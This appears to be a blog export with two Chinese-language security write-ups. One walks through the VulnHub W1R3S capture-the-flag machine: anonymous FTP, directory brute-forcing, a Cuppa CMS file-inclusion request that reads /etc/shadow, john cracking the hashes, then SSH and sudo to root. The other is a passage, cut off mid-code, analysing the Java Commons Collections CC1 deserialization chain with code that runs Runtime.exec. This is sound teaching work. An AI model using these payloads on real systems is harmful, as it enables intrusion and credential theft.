<p>21端口 ftp 使用的是vsftpd 后缀带d基本上可以使用匿名登录</p>
<p>信息收集就到这 端口扫描 详细端口扫描 udp扫描 利用漏洞脚本扫描，可能还会有ipv6的扫描</p>
<p>匿名登录</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ftp 192.168.205.136</span><br><span class="line">Connected to 192.168.205.136.</span><br><span class="line">220 Welcome to W1R3S.inc FTP service.</span><br><span class="line">Name (192.168.205.136:kali): anonymous</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password: </span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br></pre></td></tr></table></figure>

<p>这里注意ftp要切换成二进制模式 </p>
<p>发现三个目录</p>
<p>drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 content<br>drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docs<br>drwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees</p>
<p>分别进入目录将里面的txt文件下载下来</p>
<p>将下载的文件全部读取出来</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat *.txt        </span><br><span class="line">New FTP Server For W1R3S.inc</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line">01ec2d8fc11c493b25029fb1f47f39ce</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">###########################################</span></span></span><br><span class="line">___________.__              __      __  ______________________   _________    .__               </span><br><span class="line">\__    ___/|  |__   ____   /  \    /  \/_   \______   \_____  \ /   _____/    |__| ____   ____  </span><br><span class="line">  |    |   |  |  \_/ __ \  \   \/\/   / |   ||       _/ _(__  &lt; \_____  \     |  |/    \_/ ___\ </span><br><span class="line">  |    |   |   Y  \  ___/   \        /  |   ||    |   \/       \/        \    |  |   |  \  \___ </span><br><span class="line">  |____|   |___|  /\___  &gt;   \__/\  /   |___||____|_  /______  /_______  / /\ |__|___|  /\___  &gt;</span><br><span class="line">                \/     \/         \/                \/       \/        \/  \/         \/     \/ </span><br><span class="line">The W1R3S.inc employee list</span><br><span class="line"></span><br><span class="line">Naomi.W - Manager</span><br><span class="line">Hector.A - IT Dept</span><br><span class="line">Joseph.G - Web Design</span><br><span class="line">Albert.O - Web Design</span><br><span class="line">Gina.L - Inventory</span><br><span class="line">Rico.D - Human Resources</span><br><span class="line"></span><br><span class="line">​    ı pou,ʇ ʇɥıuʞ ʇɥıs ıs ʇɥǝ ʍɐʎ ʇo ɹooʇ¡</span><br><span class="line"></span><br><span class="line">....punoɹɐ ƃuıʎɐןd doʇs ‘op oʇ ʞɹoʍ ɟo ʇoן ɐ ǝʌɐɥ ǝʍ</span><br></pre></td></tr></table></figure>

<p>利用hash-identifier 对加密算法进行识别</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hash-identifier </span><br><span class="line"></span><br><span class="line">Possible Hashs:</span><br><span class="line">[+] MD5</span><br><span class="line">[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))</span><br></pre></td></tr></table></figure>

<p>识别告诉我是md5</p>
<p>网站进行解码</p>
<p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/90846274a1ac666ce6acec9ef9150df.png"></p>
<p>This[空格]is[空格]not[空格]a[空格]password</p>
<p>提示这不是密码</p>
<p>对这里面的base64进行解密</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==</span><br><span class="line">&quot;|base64 -d</span><br><span class="line">It is easy, but not that easy..</span><br></pre></td></tr></table></figure>

<p>左脑攻击右脑 </p>
<p>The W1R3S.inc employee list</p>
<p>Naomi.W - Manager<br>Hector.A - IT Dept<br>Joseph.G - Web Design<br>Albert.O - Web Design<br>Gina.L - Inventory<br>Rico.D - Human Resources</p>
<p>员工信息 待会说不定有用这里分好了职位</p>
<p>好了ftp就是这些信息</p>
<p>对80端口进行测试</p>
<p>web页面没发现有用的东西</p>
<p>爆破目录</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo gobuster dir -u http://192.168.205.136 --wordlist=/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</span><br></pre></td></tr></table></figure>

<p>&#x2F;wordpress            (Status: 301) [Size: 322] [–&gt; <a href="http://192.168.205.136/wordpress/]">http://192.168.205.136/wordpress/]</a><br>&#x2F;javascript           (Status: 301) [Size: 323] [–&gt; <a href="http://192.168.205.136/javascript/]">http://192.168.205.136/javascript/]</a><br>&#x2F;administrator        (Status: 301) [Size: 326] [–&gt; <a href="http://192.168.205.136/administrator/]">http://192.168.205.136/administrator/]</a><br>&#x2F;server-status        (Status: 403) [Size: 303]</p>
<p>amdinistrator可以直接进入 是个cms</p>
<p>wordpress进行一个跳转 到localhost&#x2F;wordpress&#x2F;</p>
<p>这里不确定是不是kali环境问题所以先对另一个cms进行测试</p>
<p>测试出来发现不能进行安装</p>
<p>查看历史漏洞</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">earchsploit cuppa    </span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"></span><br><span class="line"> Exploit Title                                                                                                                                             |  Path</span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"></span><br><span class="line">Cuppa CMS - &#x27;/alertConfigField.php&#x27; Local/Remote File Inclusion                                                                                            | php/webapps/25971.txt</span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"></span><br><span class="line">Shellcodes: No Results</span><br></pre></td></tr></table></figure>

<p>发现25971 给他下载下来</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">earchsploit cuppa -m 25971</span><br><span class="line">[!] Could not find EDB-ID #</span><br><span class="line"></span><br><span class="line">  Exploit: Cuppa CMS - &#x27;/alertConfigField.php&#x27; Local/Remote File Inclusion</span><br><span class="line">      URL: https://www.exploit-db.com/exploits/25971</span><br><span class="line">     Path: /usr/share/exploitdb/exploits/php/webapps/25971.txt</span><br><span class="line">    Codes: OSVDB-94101</span><br><span class="line"> Verified: True</span><br><span class="line">File Type: C++ source, ASCII text, with very long lines (876)</span><br><span class="line">Copied to: /home/kali/Desktop/w1r3s/25971.txt</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>发现利用方式是文件包含我们看他给的payload能不能测试成功</p>
<p>发现是不行的 </p>
<p>蒋cuppr那修改下 成administrator</p>
<p>发现是由回显但是没有爆出内容</p>
<p><a href="http://192.168.205.136/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd">http://192.168.205.136/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</a></p>
<p>这个时候考虑是不是利用POST的或是其他的东西 </p>
<p>curl –data-urlencode “urlConfig&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd<br>“ <a href="http://192.168.205.136/administrator/alerts/alertConfigField.php">http://192.168.205.136/administrator/alerts/alertConfigField.php</a></p>
<p>发现列出passwd 信息</p>
<p>那么我们可以进一步查看shadow</p>
<p>得到密码进行筛选有哈希值的账户</p>
<p>root:$6$vYcecPCy$JNbK.hr7HU72ifLxmjpIP9kTcx.&#x2F;ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ0:17554:0:99999:7:::</p>
<p>www-data:$6$8JMxE7l0$yQ16jM..ZsFxpoGue8&#x2F;0LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud1:17560:0:99999:7:::</p>
<p>w1r3s:$6$xe&#x2F;eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb&#x2F;io7x9q1iP.:17567:0:99999:7:::</p>
<p>得到这些 我们进行对哈希进行解密</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">john md5.hash </span><br><span class="line">Created directory: /home/kali/.john</span><br><span class="line">Warning: detected hash type &quot;sha512crypt&quot;, but the string is also recognized as &quot;HMAC-SHA256&quot;</span><br><span class="line">Use the &quot;--format=HMAC-SHA256&quot; option to force loading these as that type instead</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])</span><br><span class="line">Cost 1 (iteration count) is 5000 for all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Proceeding with single, rules:Single</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">www-data         (www-data)     </span><br><span class="line">Almost done: Processing the remaining buffered candidate passwords, if any.</span><br><span class="line">Proceeding with wordlist:/usr/share/john/password.lst</span><br><span class="line">computer         (w1r3s)     </span><br><span class="line">Proceeding with incremental:ASCII</span><br></pre></td></tr></table></figure>

<p>进行ssh远程登录</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ssh w1r3s@192.168.205.136</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Think this is the way?</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Well,........possibly.</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">w1r3s@192.168.205.136&#x27;s password: </span><br><span class="line">Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.13.0-36-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">108 packages can be updated.</span><br><span class="line">6 updates are security updates.</span><br><span class="line"></span><br><span class="line">.....You made it huh?....</span><br><span class="line">Last login: Mon Jan 22 22:47:27 2018 from 192.168.0.35</span><br></pre></td></tr></table></figure>

<p>登录成功可以直接sudo提权</p>
<p>获取flag</p>
<h2 id="root-W1R3S-cat-flag-txt"><a href="#root-W1R3S-cat-flag-txt" class="headerlink" title="root@W1R3S:~# cat flag.txt "></a>root@W1R3S:~# cat flag.txt </h2><hr>
<h2 id=""><a href="#" class="headerlink" title="  &#x2F; _&#x2F; _ | \ | |&#x2F; _|  _ \    &#x2F; |   | | | | |      &#x2F; |   | _&#x2F; _ | \ | &#x2F; _| | |  | | | |  | | |  | |) |  &#x2F; _ \ | | | | | | |     &#x2F; _ \ | |  | | | | |  | __ \ | || || | |\  | || |  _ &lt;  &#x2F; ___ | | | |_| | |_ &#x2F; ___ | |  | | || | |\  |) |  ____&#x2F;|| _|__|| _/_&#x2F;   __|  _&#x2F;|_____&#x2F;&#x2F;   __| |_&#x2F;|| _|____&#x2F; 
                                                                                        "></a>  &#x2F; <strong>_&#x2F; _ | \ | |&#x2F; <em>_<em>|  _ \    &#x2F; |</em>   <em>| | | | |      &#x2F; |</em>   <em>|</em> _&#x2F; _ | \ | &#x2F; <em>_<em>|<br> | |  | | | |  | | |  <em>| |</em>) |  &#x2F; _ \ | | | | | | |     &#x2F; _ \ | |  | | | | |  | _</em>_ \<br> | |</em><em>| |</em>| | |\  | |</em>| |  _ &lt;  &#x2F; ___ | | | |_| | |</strong>_ &#x2F; ___ | |  | | |<em>| | |\  |</em><strong>) |<br>  _</strong><em>___&#x2F;|</em>| _|_<em>_<em>|</em>| _/_&#x2F;   __|  _</em><em>&#x2F;|_____&#x2F;</em>&#x2F;   __| |<em><strong>_</strong>&#x2F;|</em>| _|____&#x2F; 
                                                                                        </h2><pre><code>                      .-----------------TTTT_-----_______
                    /&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;(______O] ----------____  \______/]_
 __...---&#39;&quot;&quot;&quot;\_ --&#39;&#39;   Q                               ___________@
</code></pre>
<p> |’’’                   ._   _______________&#x3D;———“””””””<br> |                ..–’’|   l L |_l   |<br> |          ..–’’      .  &#x2F;-_<strong>j ‘   ‘<br> |    ..–’’           &#x2F;  ,       ‘   ‘<br> |–’’                &#x2F;           &#96;    <br>                      L</strong>‘         \    -<br>                                    -    ‘-.<br>                                     ‘.    &#x2F;<br>                                       ‘-.&#x2F;</p>
<hr>
<h2 id="YOU-HAVE-COMPLETED-THE-INC-CHALLENGE-V-1-0"><a href="#YOU-HAVE-COMPLETED-THE-INC-CHALLENGE-V-1-0" class="headerlink" title="  YOU HAVE COMPLETED THE               __      __  ______________________   _________              &#x2F;  \    &#x2F;  /_   ______   _____  \ &#x2F;   &#x2F;              \   //   &#x2F; |   ||       &#x2F; (  &lt; __  \               \        &#x2F;  |   ||    |   /       /                        __&#x2F;\  &#x2F;   ||||  &#x2F;____  &#x2F;_______  &#x2F;.INC                     /                /       /        /        CHALLENGE, V 1.0"></a>  YOU HAVE COMPLETED THE<br>               __      __  ______________________   _________<br>              &#x2F;  \    &#x2F;  /_   ______   _____  \ &#x2F;   <strong><em><strong>&#x2F;<br>              \   //   &#x2F; |   ||       <em>&#x2F; <em>(</em></em>  &lt; _</strong></em>_  \<br>               \        &#x2F;  |   ||    |   /       /        <br>                __&#x2F;\  &#x2F;   |</strong><em>||</em><strong><em>|</em>  &#x2F;</strong>____  &#x2F;_______  &#x2F;.INC<br>                     /                /       /        /        CHALLENGE, V 1.0</h2><p>CREATED BY SpecterWires</p>
<hr>
]]></content>
      <tags>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>cc1分析</title>
    <url>/2025/03/19/cc1%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>​    </p>
<p>环境搭建不说了 网上很多优秀的文章教学</p>
<p>先列出利用的链子然后我们需要倒着进行分析</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AnnotationInvocationHandler.readObject()--&gt;</span><br><span class="line">AbstractInputCheckedMapDecorator.MapEntry.setValue()--&gt;</span><br><span class="line">TransformedMap.checkSetValue()--&gt;</span><br><span class="line">ChainedTransformer.transform()--&gt;</span><br><span class="line">InvokerTransformer.transform()</span><br></pre></td></tr></table></figure>

<p>CC1链的<strong>末尾</strong>（入口&#x2F;源头）就是Commons Collections库中的<code>Tranformer</code>接口，这个接口里面有个<code>transform</code>方法。</p>
<p><strong>InvokerTransformer</strong></p>
<p>找到这个类发现实现了Tranformer接口的方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;<span class="comment">//定义了一个返回类型是object的公共方法且接受的参数是一个input的Object</span></span><br><span class="line">    <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;<span class="comment">//检查传入的参数是否为null,为null直接返回null</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();<span class="comment">//反射获取 input 对象的 Class 对象。</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);<span class="comment">//从 cls 表示的类中查找一个公共方法，并返回对应的 Method 对象。</span></span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);<span class="comment">//调用 method 表示的方法，并返回其结果</span></span><br></pre></td></tr></table></figure>

<p>可以看到这段代码 代码不好建议逐句分析这里直接放到注释里面</p>
<p>这就完全符合反序列化的参数可控可以直接进行利用，参数可控就导致了<strong>反射调用任意类 任意方法</strong>。</p>
<p>进行利用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException &#123;</span><br><span class="line">        <span class="comment">//正常 调用可命令执行的方法</span></span><br><span class="line">        <span class="comment">//Runtime.getRuntime().exec(&quot;calc&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">cmd</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="comment">//使用反射 调用可命令执行的方法</span></span><br><span class="line">        <span class="comment">//Class clazz = Runtime.class;</span></span><br><span class="line">        <span class="comment">//Method cmdMethod = clazz.getMethod(&quot;exec&quot;, String.class);</span></span><br><span class="line">        <span class="comment">//cmdMethod.invoke(cmd, &quot;calc&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//InvokerTransformer类 调用可命令执行的方法</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(cmd);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(cmd);<span class="comment">//给InvokerTransformer里的参数赋值，然后调用transform（cmd），最终实习在cmd上实现Runtime.getRuntime().exec(&quot;calc&quot;)</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/20250319202058.png"></p>
<h3 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h3><p>知道了<code>InvokerTransformer</code>类可以调用<code>transform()</code>方法执行命令，那接下来的思路就是寻找还有其他什么地方调用了<code>InvokerTransformer</code>类的<code>transform()</code>方法。</p>
<p>可以看到在TransformedMap这个类下面的checkSetValue方法调用了从valueTransformer.transform</p>
<p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/20250320133956.png"></p>
<p>往上找valueTransformer </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(map);</span><br><span class="line">    <span class="built_in">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">    <span class="built_in">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现 keyTransformer，valueTransformer 参数可控 但是是protected，只能内部类访问，权限不够，往上找，查看是谁具体调用了方法checkSetValue()内部的这个transform()，发现是valueTransformer进行调用，查看valueTransformer，发现valueTransformer也是protect权限，继续查看valueTransformer从哪里来的，最后我们发现decorate()调用TransformedMap()的构造方法来的，所有涉及到的方法，只有decorate的权限修饰符是public</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么这个decorate类我们就可以进一步控制valueTransformer</p>
<p>关键：<code>TransformedMap</code> 本身不存储数据，而是将操作委托给原始 <code>HashMap</code>，并在操作前后触发转换器逻辑。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这里穿插一下TransformedMap装饰器本事就像是一个外挂没有实际作用需要HashMap来存储键值对，需要披挂在HashMap上才能发挥作用</span><br></pre></td></tr></table></figure>

<p>由于我们使用的是transformMap的方法，所以先去构建一个HashMap，再通过这个map来调用transformer内的decorate()来完成一个transformedMap的实例化，最后再想办法触发checkSetValue()方法即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Runtime r=Runtime.*getRuntime*();</span><br><span class="line">InvokerTransformer invokerTransformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line"><span class="comment">//invokerTransformer.transform(r);</span></span><br><span class="line"> HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(); <span class="comment">//这个直接实例化一个HashMap</span></span><br><span class="line"></span><br><span class="line"> Map&lt;Object,Object&gt; transformedmap=TransformedMap.decorate(map,<span class="literal">null</span>,invokerTransformer); </span><br><span class="line"><span class="comment">//静态方法staic修饰直接类名＋方法名调用</span></span><br><span class="line"><span class="comment">//把map当成参数传入，然后第二个参数我们用不着就赋空值null,第三个参数就是我们之前的invokerTransformer.</span></span><br></pre></td></tr></table></figure>

<p><strong>寻找调用checkSetValue()的方法</strong></p>
<p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/20250320142341.png"></p>
<p>发现AbstractlnputCheckedMapDecorator类种的setValue方法可以进行对checkSetvalue的调用那么就</p>
<p><code>checkSetValue()</code>是<code>TransformedMap</code>的关键方法，用于在值被修改时应用转换逻辑。当调用 <code>Map.Entry.setValue()</code> 修改条目值时，<code>TransformedMap</code> 的 <code>checkSetValue()</code> 会被触发，对值进行转换。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">穿插：Map里存储了键值对,每一个键值对被java封装成一个Entry对象，当想修改键值对的值的时候就可以可以直接通过`Entry`的`setValue()`方法进行修改，这里因为有装饰器TransformedMap，装饰器TransformedMap监听对值的修改操作，就是每当想调用**`setValue()`时，外挂会先触发`checkSetValue()`方法**，对修改的值做额外的处理</span><br></pre></td></tr></table></figure>

<p>MapEntry类实际上是重写父类AbstractMapEntryDecorator的setValue()方法</p>
<p>MapEntry的父类AbstractMapEntryDecorator又引入了Map.Entry接口，所以我们只需要进行常用的Map遍历，就可以调用setValue()，，然后水到渠成的调用checkSetValue()</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">解释下为什么要遍历：`TransformedMap`的机制**：它通过装饰`Map.Entry`对象（每个纸条）来监听修改操作，直接调用`map.put(&quot;键&quot;, &quot;新值&quot;)`可能绕开外挂程序，遍历后通过`entry.setValue()`修改，才能确保外挂程序被调用，**底层原因：TransformedMap`的`Map.Entry`是改装过的（`AbstractMapEntryDecorator`的子类），它的`setValue()`方法被重写，主动调用`checkSetValue()，遍历是确保每个`Entry`都使用改装后的方法的关键步骤 </span><br></pre></td></tr></table></figure>

<p>一句话就是确保每个<code>Entry</code>都使用改装后的方法，进而更好调用setvalue去调用checkSetvalue</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformedMapDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">​    map.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>); <span class="comment">//给map一个键值对，方便遍历</span></span><br><span class="line"></span><br><span class="line">​    <span class="comment">//构造transformedmap是调用tranform()的前置条件</span></span><br><span class="line">​    Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(</span><br><span class="line">​            map, <span class="literal">null</span>, invokerTransformer);</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">for</span>(Map.Entry entry:transformedMap.entrySet()) &#123;   <span class="comment">//遍历Map常用格式</span></span><br><span class="line">​        <span class="comment">//调用setValue方法，通过setValue去触发checkSetValue()</span></span><br><span class="line">​        entry.setValue(runtime);      </span><br><span class="line">​    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for(Map.Entry entry:transformedMap.entrySet()) &#123;   *//遍历Map常用格式*    entry.setValue(runtime);                      &#125;</span><br></pre></td></tr></table></figure>

<p>  在这里， transformedMap是经过装饰的 Map对象，具有特殊的行为。通过 entrySet() 方法获取了键值对的集合，然后进行遍历。transformedMap.entrySet()返回的是一个包含 <code>Map.Entry</code> 对象的集合，这样就可以遍历 M ap 的键值对。Map.Entry 是一个内部接口，用于表示<code>Map</code>中 的键值对，其中可以通过 getKey() 获取键，通过 getValue()获取值。</p>
<p>因为Map里的entrySet()是被transformedMap装饰器进行外挂的，本来是要去Map种的setvalue方法，但是经过装饰器的定义绘制街道MapEntry种调用里面的setValue方法进而去调用checkSetValue方法</p>
<p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/d7418d2c06802f2f2f3715b5cd7b0d2.png"></p>
<p>梳理</p>
<p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/9b9e63ced9a4747901d62b2c7088a6c.png"></p>
<p>首先，我们找到了TransformedMap这个类，我们想要调用其中的checkSetValue方法，但是这个类的构造器是peotected权限，只能类中访问，所以我们调用decorate方法来实例化这个类，</p>
<p> 在此之前我们先实例化了一个HashMap,并且调用了put方法给他赋了一个键值对(这里是为了让我们再后边的遍历中调用setValue()提供前置条件)，然后把这个map当成参数传入，实例化成了一个transformedmap对象，这个对象也是Map类型的，</p>
<p> 然后我们对这个对象进行遍历，在遍历过程中我们可以调用setValue方法，而恰好又遇到了一个重写了setValue的父类，这个重写的方法刚好调用了checkSetValue方法，这样就形成了一个闭环</p>
<p><strong>追寻setValue，找到readObject()</strong></p>
<h3 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line"></span><br><span class="line">    <span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        annotationType = AnnotationType.getInstance(type);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="comment">// 